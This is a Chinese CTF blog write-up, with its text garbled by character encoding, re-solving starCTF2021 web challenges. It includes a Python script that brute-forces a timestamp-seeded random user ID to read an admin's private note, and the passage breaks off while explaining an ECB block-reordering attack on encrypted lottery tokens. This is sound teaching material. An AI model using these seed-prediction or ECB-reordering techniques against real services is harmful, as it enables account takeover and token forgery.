<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='oh-my-note è€ƒç‚¹ï¼šæ—¶é—´æˆ³çˆ†ç ´
é¢˜ç›®åˆ†æ å…ˆç»™äº†æºç ï¼šsource.zip
é¢˜ç›®æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œå‘å¸ƒç•™è¨€çš„æ—¶å€™è¾“å…¥ç”¨æˆ·åå¯ä»¥é€‰æ‹©ä¸ºå…¬å¼€æˆ–è€…ç§æœ‰
ä»£ç å®¡è®¡ æ‰“å¼€æºç ï¼Œå®¡è®¡ï¼›
åœ¨create_note()å‡½æ•°ä¸­ï¼Œå¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»º
@app.route(&amp;#39;/create_note&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def create_note(): try: form = CreateNoteForm() if request.method == &amp;#34;POST&amp;#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[&amp;#39;username&amp;#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d%H:%M UTC&amp;#39;) #è·å–å°æ•°ç‚¹åå››ä½UNIXæ—¶é—´æˆ³å¯¹åº”çš„Y-M-d H-Mæ—¶é—´ random.'><title>starCTF2021å¤ç°</title>

<link rel='canonical' href='https://anthem-whisper.github.io/tmp/starctf2021%E5%A4%8D%E7%8E%B0/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='starCTF2021å¤ç°'>
<meta property='og:description' content='oh-my-note è€ƒç‚¹ï¼šæ—¶é—´æˆ³çˆ†ç ´
é¢˜ç›®åˆ†æ å…ˆç»™äº†æºç ï¼šsource.zip
é¢˜ç›®æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œå‘å¸ƒç•™è¨€çš„æ—¶å€™è¾“å…¥ç”¨æˆ·åå¯ä»¥é€‰æ‹©ä¸ºå…¬å¼€æˆ–è€…ç§æœ‰
ä»£ç å®¡è®¡ æ‰“å¼€æºç ï¼Œå®¡è®¡ï¼›
åœ¨create_note()å‡½æ•°ä¸­ï¼Œå¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»º
@app.route(&amp;#39;/create_note&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def create_note(): try: form = CreateNoteForm() if request.method == &amp;#34;POST&amp;#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[&amp;#39;username&amp;#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d%H:%M UTC&amp;#39;) #è·å–å°æ•°ç‚¹åå››ä½UNIXæ—¶é—´æˆ³å¯¹åº”çš„Y-M-d H-Mæ—¶é—´ random.'>
<meta property='og:url' content='https://anthem-whisper.github.io/tmp/starctf2021%E5%A4%8D%E7%8E%B0/'>
<meta property='og:site_name' content='wh1sper'>
<meta property='og:type' content='article'><meta property='article:section' content='Tmp' />
<meta name="twitter:title" content="starCTF2021å¤ç°">
<meta name="twitter:description" content="oh-my-note è€ƒç‚¹ï¼šæ—¶é—´æˆ³çˆ†ç ´
é¢˜ç›®åˆ†æ å…ˆç»™äº†æºç ï¼šsource.zip
é¢˜ç›®æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œå‘å¸ƒç•™è¨€çš„æ—¶å€™è¾“å…¥ç”¨æˆ·åå¯ä»¥é€‰æ‹©ä¸ºå…¬å¼€æˆ–è€…ç§æœ‰
ä»£ç å®¡è®¡ æ‰“å¼€æºç ï¼Œå®¡è®¡ï¼›
åœ¨create_note()å‡½æ•°ä¸­ï¼Œå¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»º
@app.route(&amp;#39;/create_note&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def create_note(): try: form = CreateNoteForm() if request.method == &amp;#34;POST&amp;#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[&amp;#39;username&amp;#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d%H:%M UTC&amp;#39;) #è·å–å°æ•°ç‚¹åå››ä½UNIXæ—¶é—´æˆ³å¯¹åº”çš„Y-M-d H-Mæ—¶é—´ random.">
    </head>
    <body class="article-page keep-sidebar">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.body.dataset.scheme = 'dark';
        } else {
            document.body.dataset.scheme = 'light';
        }
    })();
</script><div class="container main-container flex on-phone--column extended ">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
        
        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
        <h2 class="site-description">ä¸“æ³¨Webå®‰å…¨å’Œä»£ç å®¡è®¡</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        
            <li id="dark-mode-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <span>æš—è‰²æ¨¡å¼</span>
            </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <h2 class="article-title">
        <a href="/tmp/starctf2021%E5%A4%8D%E7%8E%B0/">starCTF2021å¤ç°</a>
    </h2>

    </div>
</header>

    <section class="article-content">
    <h3 id="oh-my-note">oh-my-note</h3>
<p>è€ƒç‚¹ï¼šæ—¶é—´æˆ³çˆ†ç ´</p>
<h4 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h4>
<p>å…ˆç»™äº†æºç ï¼š<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Doh-my-note.zip"  target="_blank" rel="noopener"
    >source.zip</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144005.png" alt="image-20210118212334753"  /></p>
<p>é¢˜ç›®æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œå‘å¸ƒç•™è¨€çš„æ—¶å€™è¾“å…¥ç”¨æˆ·åå¯ä»¥é€‰æ‹©ä¸ºå…¬å¼€æˆ–è€…ç§æœ‰</p>
<h4 id="ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</h4>
<p>æ‰“å¼€æºç ï¼Œå®¡è®¡ï¼›</p>
<p>åœ¨<code>create_note()</code>å‡½æ•°ä¸­ï¼Œå¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»º</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/create_note&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">create_note</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">form</span> <span class="o">=</span> <span class="n">CreateNoteForm</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
            <span class="n">username</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span>
            <span class="n">title</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">title</span><span class="o">.</span><span class="n">data</span>
            <span class="n">text</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">data</span>
            <span class="n">prv</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">private</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

            <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
                <span class="n">user_id</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">user_id</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
                <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
                <span class="n">user_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
                <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span>
                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
                <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>

            <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>

            <span class="n">post_at</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">tz</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M UTC&#39;</span><span class="p">)</span>
            <span class="c1">#è·å–å°æ•°ç‚¹åå››ä½UNIXæ—¶é—´æˆ³å¯¹åº”çš„Y-M-d H-Mæ—¶é—´</span>
            <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
            <span class="n">note_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>

            <span class="n">note</span> <span class="o">=</span> <span class="n">Note</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span> <span class="n">note_id</span><span class="o">=</span><span class="n">note_id</span><span class="p">,</span>
                        <span class="n">title</span><span class="o">=</span><span class="n">title</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="n">text</span><span class="p">,</span>
                        <span class="n">prv</span><span class="o">=</span><span class="n">prv</span><span class="p">,</span> <span class="n">post_at</span><span class="o">=</span><span class="n">post_at</span><span class="p">)</span>
            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">note</span><span class="p">)</span>
            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>

        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;create.html&#34;</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">pass</span>

</code></pre></div><p>å…¶ä¸­ï¼Œæˆ‘ä»¬<code>post_at</code>å·²ç»çŸ¥é“</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144023.png" alt="image-20210119142946848"  /></p>
<p>é‚£ä¹ˆåœ¨ä¸‹é¢è¿™å¼ å›¾é‡Œï¼Œæˆ‘ä»¬åªæœ‰<code>user_id</code>ä¸çŸ¥é“</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144031.png" alt="image-20210119142616697"  /></p>
<p>è€Œmy_note()çš„elseé‡Œé¢åªéœ€è¦<code>user_id</code>å°±å¯ä»¥åˆ—å‡ºæ‰€æœ‰ç§æœ‰note</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/my_notes&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">my_notes</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">):</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
        <span class="n">user_id</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span><span class="o">.</span><span class="n">user_id</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">user_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user_id&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">user_id</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>

    <span class="n">results</span> <span class="o">=</span> <span class="n">Note</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
    <span class="n">notes</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
        <span class="n">note</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="n">note</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">title</span>
        <span class="n">note</span><span class="p">[</span><span class="s1">&#39;note_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">note_id</span>
        <span class="n">notes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">note</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;my_notes.html&#34;</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
</code></pre></div><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æ ¹æ®å·²çŸ¥çš„<code>note_id</code>å’Œ<code>post_at</code>æ¥<del>åæ¨</del>çˆ†ç ´<code>user_id</code>ï¼Œåªè¦ç®—å‡ºadminçš„idå³å¯çœ‹åˆ°å‘å¸ƒçš„ç§æœ‰flagã€‚</p>
<p>å› ä¸ºæ—¶é—´æˆ³ç²¾ç¡®åˆ°äº†å°æ•°ç‚¹åå››ä½ï¼Œæˆ‘ä»¬çŸ¥é“çš„<code>post_at</code>æ˜¯åˆ†é’Ÿçº§åˆ«çš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦çˆ†ç ´æœ€å¤š<code>10000*60</code>æ¬¡</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>

<span class="n">post_at</span> <span class="o">=</span> <span class="s1">&#39;2021-01-15 02:29 UTC&#39;</span><span class="c1">#adminå‘å¸ƒçš„ç¬¬ä¸€ä¸ªPubic noteæ—¶é—´</span>

<span class="n">l</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">/</span><span class="mi">10000</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)]</span><span class="c1">#å°æ•°éƒ¨åˆ†ï¼Œlæ˜¯ä¸€ä¸ªåˆ—è¡¨</span>
<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">60</span><span class="p">):</span>
    <span class="n">ta1</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="s1">&#39;2021-01-15 10:29:{} UTC&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S UTC&#39;</span><span class="p">)</span><span class="c1">#æ ¼å¼åŒ–æ—¶é—´ï¼Œå› ä¸ºæ—¶åŒºä¸åŒéœ€è¦åŠ 8å°æ—¶    </span>
    <span class="n">ta</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">mktime</span><span class="p">(</span><span class="n">ta1</span><span class="p">))</span><span class="c1">#è½¬æ¢ä¸ºæ—¶é—´æˆ³</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">ta</span> <span class="o">+</span> <span class="n">i</span><span class="c1">#æ•´æ•°éƒ¨åˆ†ä¸å°æ•°éƒ¨åˆ†æ‹¼æ¥</span>
        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
        <span class="n">u_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>

        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">u_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
        <span class="n">p_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">p_id</span> <span class="o">==</span> <span class="s1">&#39;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#39;</span><span class="p">:</span><span class="c1">#adminå‘å¸ƒçš„ç¬¬ä¸€ä¸ªPubic note</span>
            <span class="k">print</span><span class="p">(</span><span class="n">u_id</span><span class="p">)</span>
            <span class="c1">#ç®—å‡ºæ¥admindçš„useridæ˜¯7bdeij4oiafjdypqyrl2znwk7w9lulgn</span>
        
        <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">10000</span> <span class="o">%</span> <span class="mi">8999</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
</code></pre></div><p>æœ‰ä¸€ä¸ªå‘ï¼Œå› ä¸ºæ—¶åŒºåŸå› ï¼Œä»è·å¾—çš„æ—¶é—´åæ¨æ—¶é—´æˆ³çš„æ—¶å€™éœ€è¦åŠ 8ä¸ªå°æ—¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144048.png" alt="image-20210119143535541"  /></p>
<p>*ctf{Y0u_Are_t3e_Master_of_3he_Time!}</p>
<h3 id="lottery-again">lottery again</h3>
<p>è€ƒç‚¹ï¼šEBCé‡æ’æ”»å‡»ï¼Œjson_decode</p>
<h4 id="é¢˜ç›®åˆ†æ-1">é¢˜ç›®åˆ†æ</h4>
<p>é¢˜ç›®é¦–å…ˆç»™äº†æºç ï¼š<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Dlottery%20again.zip"  target="_blank" rel="noopener"
    >source.zip</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144055.png" alt="image-20210118172658033"  /></p>
<p>ç½‘ç«™çš„åŠŸèƒ½æ˜¯æ³¨å†Œï¼Œç™»é™†ï¼Œbuy lotteryï¼Œæ¯ä¸€ä¸ªç”¨æˆ·åˆå§‹åªæœ‰300ï¼Œä¹°ä¸€æ¬¡å½©ç¥¨èŠ±100ï¼Œè·å¾—é‡‘é¢æ˜¯1~100ï¼Œç„¶è€Œflagéœ€è¦9999ã€‚</p>
<p>æ‰“å¼€æºç ï¼Œå®¡è®¡ï¼Œä¸»è¦åŠŸèƒ½åœ¨Http/Controller/LotteryController.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144108.png" alt="image-20210118184827067"  /></p>
<p>åŒæ—¶ç»“åˆæŠ“åˆ°çš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å¾—çŸ¥è¿ä½œæ–¹å¼æ˜¯ï¼š</p>
<pre><code>function buy()(ç”Ÿæˆä¸€å•lotteryï¼Œè¿”å›å¯¹ç§°åŠ å¯†åçš„enc)-&gt;
function info()(å®¢æˆ·ç«¯å‘é€encï¼ŒæœåŠ¡ç«¯å¯¹ç§°è§£å¯†å¹¶ä¸”jsondecodeï¼Œè¿”å›è¿™å•lotteryçš„ä¿¡æ¯)-&gt;
function charge()(æ¥æ”¶å®¢æˆ·ç«¯çš„encï¼Œå¯¹ç§°è§£å¯†å¹¶ä¸”jsondecodeï¼Œæ ¹æ®è§£å¯†å¾—åˆ°çš„user uuidæ‰¾åˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œæ ¹æ®lottery uuidæ‰¾åˆ°lotteryä¿¡æ¯ï¼ŒæŠŠlotteryçš„é’±åŠ åˆ°userè´¦æˆ·)
</code></pre><p>åœ¨<code>function buy()</code>é‡Œé¢æœ‰è¿™ä¹ˆå‡ è¡Œä»£ç ï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$lottery</span> <span class="o">=</span> <span class="nx">Lottery</span><span class="o">::</span><span class="na">create</span><span class="p">([</span><span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="mi">100</span> <span class="o">-</span> <span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">random_int</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)))]);</span>
<span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">([</span>
    <span class="s1">&#39;lottery&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
    <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
    <span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">coin</span><span class="p">,</span>
<span class="p">]);</span>
<span class="nv">$enc</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_256</span><span class="p">,</span> <span class="nx">env</span><span class="p">(</span><span class="s1">&#39;LOTTERY_KEY&#39;</span><span class="p">),</span> <span class="nv">$serilized</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_ECB</span><span class="p">));</span>
